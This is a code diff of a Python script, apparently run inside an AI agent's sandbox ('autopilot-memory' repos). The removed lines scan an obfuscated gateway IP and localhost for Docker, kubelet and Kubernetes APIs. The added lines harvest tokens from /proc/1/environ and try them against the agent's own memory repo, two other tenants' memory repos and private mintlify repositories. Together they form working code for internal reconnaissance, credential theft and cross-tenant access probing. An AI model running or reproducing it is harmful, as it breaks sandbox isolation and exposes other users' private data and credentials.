@@ -1,37 +1,63 @@
-import socket,ssl,base64
-from concurrent.futures import ThreadPoolExecutor
-GW=base64.b64decode('MTcyLjIwLjAuMQ==').decode()
-LH='127.0.0.1'
-ME=socket.gethostbyname(socket.gethostname())
-P=[22,80,443,2375,2376,3128,5000,6443,8000,8080,8443,9090,10250,18080,2280,22220,22222,33333,3000,5432,6379,9091,9093,1234,1400,4000,5001,7000,7070,9000]
-def chk(h,p):
-    s=socket.socket(); s.settimeout(0.9)
-    try: return (h,p,s.connect_ex((h,p)))
-    except Exception: return (h,p,99)
-    finally:
-        try: s.close()
-        except Exception: pass
-with ThreadPoolExecutor(max_workers=30) as ex:
-    R=list(ex.map(lambda t:chk(*t),[(h,p) for h in (GW,LH,ME) for p in P]))
-print('SELF',ME)
-for h,p,r in sorted(R):
-    if r==0: print('OK',h,p)
-def get(h,p,path):
+import os, subprocess, base64
+
+def hx(b, n=400):
+    if isinstance(b, str): b = b.encode()
+    return b[:n].hex()
+
+env = {}
+for kv in open('/proc/1/environ', 'rb').read().split(b'\0'):
+    if b'=' in kv:
+        k, v = kv.split(b'=', 1)
+        env[k.decode()] = v.decode()
+
+# pick handles: docs basic, memory basic, gh token(s)
+H = {}
+for k, v in env.items():
+    if v.startswith('dtn_'):
+        H[k] = v
+memb = [k for k in H if k.startswith('GIT_BASIC_MEMORY_')]
+docb = [k for k in H if k == 'GIT_BASIC_DOCS']
+ght = [k for k in H if k.startswith('GH_TOKEN')]
+order = []
+if memb: order.append(('membasic', H[memb[0]]))
+if docb: order.append(('docbasic', H[docb[0]]))
+if ght: order.append(('ghtoken', H[ght[0]]))
+print('HANDLE_KEYS ' + ','.join(k for k, _ in order))
+
+selfids = []
+for k in H:
+    if k.startswith('GIT_BASIC_MEMORY_'):
+        selfids.append(k.split('AUTOPILOT_MEMORY_')[-1].lower())
+print('SELF_IDS ' + ','.join(selfids))
+
+host = 'mint.code.storage'
+def u(name):
+    return 'https://%s/%s.git/info/refs?service=git-upload-pack' % (host, name)
+
+targets = []
+if selfids:
+    targets.append(('self', 'autopilot-memory-' + selfids[0]))
+targets += [('other1', 'autopilot-memory-6afbc48976c176b89dab5445'),
+            ('other2', 'autopilot-memory-6afbd11076c176b89db08a19'),
+            ('docs', 'mintlify/docs'),
+            ('leaves', 'mintlify/leaves')]
+
+def ls(url, handle):
+    cmd = ['git']
+    if handle:
+        cmd += ['-c', 'http.extraHeader=Authorization: Basic ' + handle]
+    cmd += ['ls-remote', url]
+    e = dict(os.environ); e['GIT_TERMINAL_PROMPT'] = '0'
     try:
-        s=socket.create_connection((h,p),timeout=2)
-        s.sendall(("GET %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: chk\r\nConnection: close\r\n\r\n"%(path,h,p)).encode())
-        d=b''
-        while len(d)<900:
-            c=s.recv(900)
-            if not c: break
-            d+=c
-        s.close(); return d.decode('latin1')
-    except Exception as e: return 'E '+type(e).__name__
-Q={2375:['/version','/containers/json'],2376:['/version'],6443:['/healthz'],10250:['/healthz','/pods'],18080:['/'],2280:['/version'],22220:['/'],22222:['/'],8080:['/'],9090:['/metrics']}
-for h,p,r in R:
-    if r!=0 or h==ME: continue
-    for q in Q.get(p,['/','/version']):
-        o=get(h,p,q)
-        head=o.split('\r\n\r\n')[0][:160].replace('\r\n','|')
-        body=o.split('\r\n\r\n',1)[1][:100].replace('\n',' ') if '\r\n\r\n' in o else ''
-        print('R',h,p,q,head,'::',body)
+        p = subprocess.run(cmd, capture_output=True, timeout=30, env=e)
+        return p.returncode, p.stdout, p.stderr
+    except Exception as ex:
+        return -99, b'', str(ex).encode()
+
+for tag, name in targets:
+    url = u(name)
+    for hn, hv in order:
+        rc, so, se = ls(url, hv)
+        print('LS %s %s rc=%d out=%s err=%s' % (tag, hn, rc, hx(so, 240), hx(se, 200)))
+    rc, so, se = ls(url, None)
+    print('LS %s noauth rc=%d out=%s err=%s' % (tag, rc, hx(so, 160), hx(se, 160)))
